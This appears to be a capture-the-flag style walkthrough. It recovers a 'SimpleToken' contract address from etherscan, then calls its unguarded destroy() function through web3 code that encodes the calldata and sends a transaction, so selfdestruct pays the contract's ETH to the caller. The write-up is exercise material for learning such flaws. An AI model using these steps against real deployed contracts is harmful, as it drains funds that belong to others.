Firstly we need to get contract address. We can get it from etherscan, go to deployed contract address, search for deploy tx, go to details and there should be address
of `SimpleToken` contract.

If we have it we need to call `destroy()`, selfdestruct destroy contract and sends all ETH to given address.
To calculate function `data` needed to send tx we need to use `encodeFunctionCall`:
```
await web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to'
    }]
}, ['0xd107AC5e5830BB95f880cA3b1270ccCdAA0A3c5e']); // parameter of function
```
That gives: `0x00f55d9d000000000000000000000000d107ac5e5830bb95f880ca3b1270cccdaa0a3c5e`

Now we are ready to call `destroy()`:
```
await web3.eth.sendTransaction({
    to: '0xe2A57AA386552e41B350fFAC1526AeFBFA5F7da4',
    data: '0x00f55d9d000000000000000000000000d107ac5e5830bb95f880ca3b1270cccdaa0a3c5e',
    from: '0xd107AC5e5830BB95f880cA3b1270ccCdAA0A3c5e'
})
```
